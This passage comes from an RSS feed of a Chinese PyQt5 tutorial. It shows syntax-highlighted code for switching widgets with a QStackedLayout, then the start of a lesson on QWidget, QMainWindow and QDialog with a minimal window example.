<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> Window1</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QWidget</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">        QLabel</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"我是抽屉1要显示的内容"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setStyleSheet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"background-color:green;"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> Window2</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QWidget</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">        QLabel</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"我是抽屉2要显示的内容"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setStyleSheet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"background-color:red;"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> MyWindow</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QWidget</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic"> parent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">None</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(parent)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">create_stacked_layout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> create_stacked_layout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 创建堆叠(抽屉)布局</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.stacked_layout </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QStackedLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 创建单独的Widget</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        win1 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> Window1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        win2 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> Window2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 将创建的2个Widget添加到抽屉布局器中</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.stacked_layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(win1)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.stacked_layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(win2)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 设置Widget大小以及固定宽高</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setFixedSize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">300</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">270</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 1. 创建整体的布局器</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        container </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QVBoxLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 2. 创建1个要显示具体内容的子Widget</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        widget </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        widget.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.stacked_layout)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        widget.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setStyleSheet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"background-color:grey;"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 3. 创建2个按钮，用来点击进行切换抽屉布局器中的Widget</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn_press1 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QPushButton</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"抽屉1"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn_press2 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QPushButton</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"抽屉2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 给按钮添加事件（即点击后要调用的函数）</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn_press1.clicked.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">connect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.btn_press1_clicked)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn_press2.clicked.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">connect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.btn_press2_clicked)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 4. 将需要显示的空间添加到布局器中</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        container.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(widget)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        container.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(btn_press1)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        container.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(btn_press2)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 5. 设置当前要显示的Widget，从而能够显示这个布局器中的控件</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(container)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> btn_press1_clicked</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 设置抽屉布局器的当前索引值，即可切换显示哪个Widget</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.stacked_layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setCurrentIndex</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> btn_press2_clicked</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 设置抽屉布局器的当前索引值，即可切换显示哪个Widget</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.stacked_layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setCurrentIndex</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "__main__"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    win </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> MyWindow</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    win.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>效果：</p>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>005-窗口</title>
      <link>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/005-%E7%AA%97%E5%8F%A3.html</link>
      <guid>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/005-%E7%AA%97%E5%8F%A3.html</guid>
      <source url="https://www.geekery.cn/rss.xml">005-窗口</source>
      <description>005-窗口 一、分类 在Qt中，生成窗口有三种方式： QWidget | QMainWindow | QDialog 1. QWidget 控件和窗口的父类 ，自由度高（什么都东西都没有），没有划分菜单、工具栏、状态栏、主窗口 等区域 2. QMainWindow 是 QWidget的子类，包含菜单栏，工具栏，状态栏，标题栏等，中间部分则为主窗口区域...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>一、分类</h2>
<p>在Qt中，生成窗口有三种方式：  <code>QWidget</code>  |  <code>QMainWindow</code> | <code>QDialog</code></p>
<h3>1. QWidget</h3>
<p>控件和窗口的父类 ，自由度高（什么都东西都没有），没有划分菜单、工具栏、状态栏、主窗口 等区域</p>
<h3>2. QMainWindow</h3>
<p>是<code> QWidget</code>的子类，包含菜单栏，工具栏，状态栏，标题栏等，中间部分则为主窗口区域</p>
<h3>3. QDialog</h3>
<p>对话框窗口的基类</p>
<h2>二、QWidget</h2>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QWidget, QLabel , QApplication</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> mywnd</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QWidget</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(mywnd, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">).</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">initUI</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> initUI</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        label </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QLabel</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"这是文字~~"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> )</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        label.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setStyleSheet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"font-size:30px;color:red"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        label.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setParent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> mywnd</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    #设置窗口标题</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWindowTitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"qwidget"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 展示窗口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 程序进行循环等待状态</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
